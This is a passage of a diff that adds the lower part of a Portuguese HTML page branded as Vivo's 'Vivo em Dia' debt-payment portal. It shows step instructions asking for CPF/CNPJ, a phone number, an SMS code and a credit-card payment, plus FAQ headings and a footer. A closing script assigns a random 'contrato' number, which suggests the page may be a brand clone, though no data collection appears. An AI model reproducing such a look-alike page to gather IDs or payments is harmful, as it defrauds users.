+<path d="M24.11 23.7a.56.56 0 00-.57-.57.58.58 0 00-.19 0 .63.63 0 00-.38.37.59.59 0 00.2.64.29.29 0 01.13.28V25a.21.21 0 00.21.22.21.21 0 00.22-.22v-.56a.34.34 0 01.14-.28.58.58 0 00.24-.47" transform="translate(-17.75 -17.18)" fill="#652c90" fill-rule="evenodd"></path>
+</svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="vivoInfo2">
+<div class="containerPrincipal container-fluid">
+<div class="row">
+<div class="col-md-3 col-10 col-sm-10 mr-auto ml-auto">
+<div class="tituloInfo">Veja como é fácil</div>
+<div class="descricaoInfo">Passo a Passo</div>
+</div>
+<div class="col-md-9 col-11 col-sm-11 mr-auto ml-auto">
+<div class="row cardPasso mobileFlexNoWrap">
+<div class="col-vivo-md-20 col-5 col-sm-5 desktopPadding0 mobilePadding0">
+<div class="containerCardInfo2">
+<div class="card1">
+<div class="number">1</div>
+<div class="text1">Após acessar o site, informe seu CPF ou o CNPJ de sua empresa e um número de telefone VIVO. <div>Mas se seus serviços Vivo já estiverem cancelados, você pode informar seu celular atual para recebimento do token. Neste caso, o número do telefone pode ser de qualquer operadora</div>
+</div>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-5 col-sm-5 desktopPadding0 mobilePadding0">
+<div class="containerCardInfo2">
+<div class="card2">
+<div class="number">2</div>
+<div class="text">Depois de informar seus dados, você receberá em seu celular, uma mensagem de SMS com o código de verificação. Digite este código para continuar.</div>
+<div class="text"></div>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-5 col-sm-5 desktopPadding0 mobilePadding0">
+<div class="containerCardInfo2">
+<div class="card3">
+<div class="number">3</div>
+<div class="text">Prontinho! Você conseguirá ver o(s) seu(s) serviço(s) VIVO que possuem conta(s) em aberto. Selecione qual serviço deseja acessar para ver mais informações.</div>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-5 col-sm-5 desktopPadding0 mobilePadding0">
+<div class="containerCardInfo2">
+<div class="card4">
+<div class="number">4</div>
+<div class="text">Agora é só escolher o que você deseja fazer: Consultar débitos em aberto, pegar a 2ª via, copiar codigo de barras ou pagar com o cartão de crédito.</div>
+</div>
+<div class="iconeVivo">
+<svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29.73 37.06">
+<path d="M1.71 10.07a7.55 7.55 0 002.48 2.63c2.24 1.34 3.55.75 4.07 1.13.26.2.57.75.43 1.05-.14.85-1.82 1-2.6 1.18l-2.57.54c-1.56.34-3.43.78-3.56 2.89a7.58 7.58 0 00.64 2.57c0 .25.91.86 1.07.93 1.53.71 2.54.2 4.3-.17 1.57-.33 3.33-1 4.27-.06a2.3 2.3 0 01.72 1.39c.24.66-.27 2.48-.47 3.13a5.87 5.87 0 00-.16.6l-1 3.82a.76.76 0 00-.08.32l-.29 1.57a2.74 2.74 0 00.81 2.51 4.07 4.07 0 00.38.28 3.31 3.31 0 001.28.48c.18.05.25.08.44.12a2.94 2.94 0 003.44-1.59c.07-.15.1-.27.16-.43l.5-2a1.68 1.68 0 01.07-.24l1.06-4.49a1.51 1.51 0 01.53-.82c.84-.61 1.55.09 2.64.54l.41.19 5 2.26c2 .62 3.33-1.33 3.93-3a2.36 2.36 0 00-.78-2.5 28.44 28.44 0 00-3.44-1.66 7.79 7.79 0 00-.72-.34c-1.71-.73-4.71-1.78-5.51-3.61s1-2.78 2.45-3.91a25.84 25.84 0 002.15-1.83c1.19-1.22 1-2.3.26-3.58-.93-1.62-2.42-2.48-4.39-1.48-.81.42-4.46 3.71-5.1 4a1 1 0 01-1.22-1.1c.14-.69 2-2.51 1.5-5.68-.06-.39-.15-.71-.21-1.06A6.16 6.16 0 0010.96.54 7.1 7.1 0 009.19.08a7.57 7.57 0 00-6.77 2.74 8.6 8.6 0 00-1.13 2.1l-.14.6a7.64 7.64 0 00-.19 1.79 7.07 7.07 0 00.74 2.76" fill="#eb3f7e" fill-rule="evenodd"></path>
+</svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section class="containerFaq">
+<div class="containerPrincipal container-fluid">
+<div class="row">
+<div class="faqDescricao col-9 desktopPadding0 mr-auto ml-auto">
+<div class="tituloFaq">Perguntas Frequentes</div>
+<div class="descricaoFaq">Aqui você encontra respostas para as perguntas mais frequentes.</div>
+</div>
+</div>
+<div class="row">
+<div class="col-md-3 col-10 col-sm-12"></div>
+<div class="col-md-9 col-10 col-sm-10 mr-auto ml-auto">
+<div class="flexCenter" style="height: 100%;">
+<div style="width: 100%;">
+<div class="collapseFaq">O que é o portal Vivo em Dia? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">As contas em aberto de quais serviços Vivo estão disponíveis no portal Vivo em Dia? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Como faço para negociar minhas contas Vivo em aberto no portal Vivo em Dia? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Por quanto tempo as contas ficam disponíveis no portal Vivo em Dia? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Posso pagar minhas contas Vivo com cartão de crédito? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Onde posso pagar minhas contas Vivo? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Quanto tempo demora para aparecer o pagamento da minha conta na Vivo? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+<div class="collapseFaq">Como faço para falar com a Vivo por telefone? <div class="collapseIcone">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="22px" fill="white">
+<path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path>
+</svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<footer class="footerVivoEmDia">
+<div class="containerPrincipal container-fluid">
+<div class="row">
+<div class="col-md-4 d-none d-sm-none d-md-block">
+<div class="flexCenter" style="height: 100%;">
+<div class="copyright">Copyright © Vivo. Todos os direitos reservados</div>
+</div>
+</div>
+<div class="col-md-1 d-none d-sm-none d-md-block"></div>
+<div class="col-md-7 col-12 col-sm-12">
+<div class="flexCenter itemFooter" style="justify-content: space-between;">
+<div class="siteProtegido d-none d-sm-none d-md-block">
+<div class="flexCenter">
+<div style="width: 30px;">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12.49 13.64">
+<defs>
+<style>
+                            .prefix__cls-4 {
+                              fill-rule: evenodd;
+                              fill: #81b7dd
+                            }
+                          </style>
+</defs>
+<path d="M30.25 19.23c0 8.49-5.19 11-6.11 11.56a.28.28 0 01-.28 0c-.92-.56-6.11-3.07-6.11-11.56a.35.35 0 01.34-.34h.19a9.58 9.58 0 005.53-1.65.35.35 0 01.39 0 9.86 9.86 0 005.53 1.65h.19a.35.35 0 01.33.34" transform="translate(-17.75 -17.18)" fill-rule="evenodd" fill="#0aabdb"></path>
+<path d="M29.92 18.89h-.19a9.78 9.78 0 01-5.53-1.65h-.13v13.57a.07.07 0 00.06 0c.92-.57 6.11-3.07 6.11-11.55a.33.33 0 00-.32-.37z" transform="translate(-17.75 -17.18)" fill="#3095ce" fill-rule="evenodd"></path>
+<path d="M24 29.28c-1.39-.81-4.52-3.18-4.83-9a11.16 11.16 0 004.83-1.5 11.3 11.3 0 004.85 1.48c-.33 5.84-3.45 8.21-4.85 9" transform="translate(-17.75 -17.18)" fill="#83c7e5" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M24.08 18.82v10.41c1.43-.85 4.44-3.23 4.77-9a11.19 11.19 0 01-4.77-1.41z" transform="translate(-17.75 -17.18)"></path>
+<path d="M25.56 24.39h-.44V21.8a1.09 1.09 0 00-2.18 0v2.59h-.44V21.8a1.53 1.53 0 113.06 0z" transform="translate(-17.75 -17.18)" fill="#f9db4f" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M25.76 22.85h-3.58a.43.43 0 00-.42.42V26a.42.42 0 00.42.42h3.58a.42.42 0 00.43-.42v-2.73a.42.42 0 00-.43-.42" transform="translate(-17.75 -17.18)"></path>
+<path d="M23.05 22.41h2.71a.42.42 0 01.43.42v2.71a.42.42 0 01-.43.42h-2.71a.42.42 0 01-.42-.42v-2.71a.42.42 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#cb215a" fill-rule="evenodd"></path>
+<path d="M22.18 22.41h2.71a.42.42 0 01.42.42v2.71a.42.42 0 01-.42.42h-2.71a.41.41 0 01-.42-.42v-2.71a.43.43 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#eb3f7e" fill-rule="evenodd"></path>
+<path d="M24.11 23.7a.56.56 0 00-.57-.57.58.58 0 00-.19 0 .63.63 0 00-.38.37.59.59 0 00.2.64.29.29 0 01.13.28V25a.21.21 0 00.21.22.21.21 0 00.22-.22v-.56a.34.34 0 01.14-.28.58.58 0 00.24-.47" transform="translate(-17.75 -17.18)" fill="#652c90" fill-rule="evenodd"></path>
+</svg>
+</div>
+<div style="padding-left: 10px;">Site Protegido SSL</div>
+</div>
+</div>
+<div class="flexCenter politicaPrivacidade">
+<div>
+<a href="/politica-de-privacidade">Política de Privacidade</a> | <a href="/duvidas-frequentes">Dúvidas frequentes</a>
+</div>
+</div>
+<div class="flexCenter">
+<div class="siteProtegido d-block d-sm-block d-md-none">
+<div class="flexCenter">
+<div style="width: 30px;">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12.49 13.64">
+<defs>
+<style>
+                              .prefix__cls-4 {
+                                fill-rule: evenodd;
+                                fill: #81b7dd
+                              }
+                            </style>
+</defs>
+<path d="M30.25 19.23c0 8.49-5.19 11-6.11 11.56a.28.28 0 01-.28 0c-.92-.56-6.11-3.07-6.11-11.56a.35.35 0 01.34-.34h.19a9.58 9.58 0 005.53-1.65.35.35 0 01.39 0 9.86 9.86 0 005.53 1.65h.19a.35.35 0 01.33.34" transform="translate(-17.75 -17.18)" fill-rule="evenodd" fill="#0aabdb"></path>
+<path d="M29.92 18.89h-.19a9.78 9.78 0 01-5.53-1.65h-.13v13.57a.07.07 0 00.06 0c.92-.57 6.11-3.07 6.11-11.55a.33.33 0 00-.32-.37z" transform="translate(-17.75 -17.18)" fill="#3095ce" fill-rule="evenodd"></path>
+<path d="M24 29.28c-1.39-.81-4.52-3.18-4.83-9a11.16 11.16 0 004.83-1.5 11.3 11.3 0 004.85 1.48c-.33 5.84-3.45 8.21-4.85 9" transform="translate(-17.75 -17.18)" fill="#83c7e5" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M24.08 18.82v10.41c1.43-.85 4.44-3.23 4.77-9a11.19 11.19 0 01-4.77-1.41z" transform="translate(-17.75 -17.18)"></path>
+<path d="M25.56 24.39h-.44V21.8a1.09 1.09 0 00-2.18 0v2.59h-.44V21.8a1.53 1.53 0 113.06 0z" transform="translate(-17.75 -17.18)" fill="#f9db4f" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M25.76 22.85h-3.58a.43.43 0 00-.42.42V26a.42.42 0 00.42.42h3.58a.42.42 0 00.43-.42v-2.73a.42.42 0 00-.43-.42" transform="translate(-17.75 -17.18)"></path>
+<path d="M23.05 22.41h2.71a.42.42 0 01.43.42v2.71a.42.42 0 01-.43.42h-2.71a.42.42 0 01-.42-.42v-2.71a.42.42 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#cb215a" fill-rule="evenodd"></path>
+<path d="M22.18 22.41h2.71a.42.42 0 01.42.42v2.71a.42.42 0 01-.42.42h-2.71a.41.41 0 01-.42-.42v-2.71a.43.43 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#eb3f7e" fill-rule="evenodd"></path>
+<path d="M24.11 23.7a.56.56 0 00-.57-.57.58.58 0 00-.19 0 .63.63 0 00-.38.37.59.59 0 00.2.64.29.29 0 01.13.28V25a.21.21 0 00.21.22.21.21 0 00.22-.22v-.56a.34.34 0 01.14-.28.58.58 0 00.24-.47" transform="translate(-17.75 -17.18)" fill="#652c90" fill-rule="evenodd"></path>
+</svg>
+</div>
+<div style="padding-left: 10px; padding-right: 10px;">Site Protegido SSL</div>
+</div>
+</div>
+<div>
+<div class="iconeFooterVivo">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16.78 5" color="#fff">
+<defs>
+<style>
+                            .prefix__cls-1 {
+                              fill: #fff;
+                              fill-rule: evenodd
+                            }
+                          </style>
+</defs>
+<path class="prefix__cls-1" d="M25.88 26.18a.59.59 0 10.7.58.6.6 0 00-.29-.51.61.61 0 00-.3-.08zm-.31-.86a1.47 1.47 0 01.42-.06 1.5 1.5 0 011.5 1.45v.1a1.5 1.5 0 01-.95 1.34 1.45 1.45 0 01-.5.11H26a1.5 1.5 0 01-.38-2.94M19.94 23.82H20a.58.58 0 01.42.22.58.58 0 01.13.37.59.59 0 11-1.17 0 .58.58 0 01.23-.47.63.63 0 01.33-.12zM16.14 25.28a.27.27 0 01.12 0 .34.34 0 01.27.13.75.75 0 01.07.12l.73 1.47.75-1.5a.41.41 0 01.07-.11.36.36 0 01.26-.12h.12l.35.16a.33.33 0 01.18.29.37.37 0 01-.05.18L17.82 28a.43.43 0 01-.34.21h-.27a.42.42 0 01-.32-.16l-.06-.05-1.17-2.07a.3.3 0 01-.05-.15.33.33 0 01.18-.26l.35-.15M21.38 25.29a.28.28 0 01.15 0 .35.35 0 01.24.1.27.27 0 01.09.12l.49 1 .26.52c.26-.51.51-1 .77-1.54a.35.35 0 01.3-.18h.12l.35.16a.31.31 0 01.18.28.32.32 0 01-.05.19L23.12 28l-.05.08a.43.43 0 01-.33.17h-.27a.42.42 0 01-.32-.19s0-.07-.07-.1c-.37-.67-.75-1.34-1.13-2a.61.61 0 01-.07-.17.33.33 0 01.2-.3l.3-.13M19.75 25.3h.39a.36.36 0 01.35.36v2.17a.57.57 0 010 .13.35.35 0 01-.22.24.31.31 0 01-.13 0h-.32a.37.37 0 01-.33-.26.68.68 0 010-.15v-2.1a.68.68 0 010-.14.36.36 0 01.27-.25M31.5 24.63a1 1 0 01-.25.66l-.18.14c-.09.06-.16.1-.12.2s.15.07.26 0l.72-.17H32a.35.35 0 01.34.27l.05.23a.19.19 0 010 .08.34.34 0 01-.25.33l-.74.18c-.14 0-.22.11-.22.24a.29.29 0 00.07.18c.05.05.81 1 .81 1a.31.31 0 01.07.2.35.35 0 01-.13.27l-.18.15a.35.35 0 01-.22.08.32.32 0 01-.25-.12s-.51-.61-.56-.68-.12-.16-.21-.16-.16.1-.21.16l-.56.69a.36.36 0 01-.26.11.31.31 0 01-.21-.07l-.19-.15a.36.36 0 01-.06-.47l.81-1a.29.29 0 00.07-.18c0-.14-.08-.21-.22-.24l-.75-.15a.35.35 0 01-.25-.34V26l.06-.23a.33.33 0 01.33-.27h.07l.71.17c.11 0 .23.05.26-.05s0-.14-.12-.2l-.18-.14a1 1 0 01-.26-.65.94.94 0 01.94-.92.92.92 0 01.93.91z" transform="translate(-15.61 -23.72)"></path>
+</svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-12 d-md-none">
+<div class="flexCenter" style="height: 100%;">
+<div class="copyright">Copyright © Vivo. Todos os direitos reservados</div>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div id="toastr-container">
+<div class="toastr toastr-warning">
+<div id="toastr-message" class="toastr-message"></div>
+</div>
+</div>
+<script>
+  var randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
+  sessionStorage.setItem('contrato', randomNumber);
+</script>
+</body>
+</html>
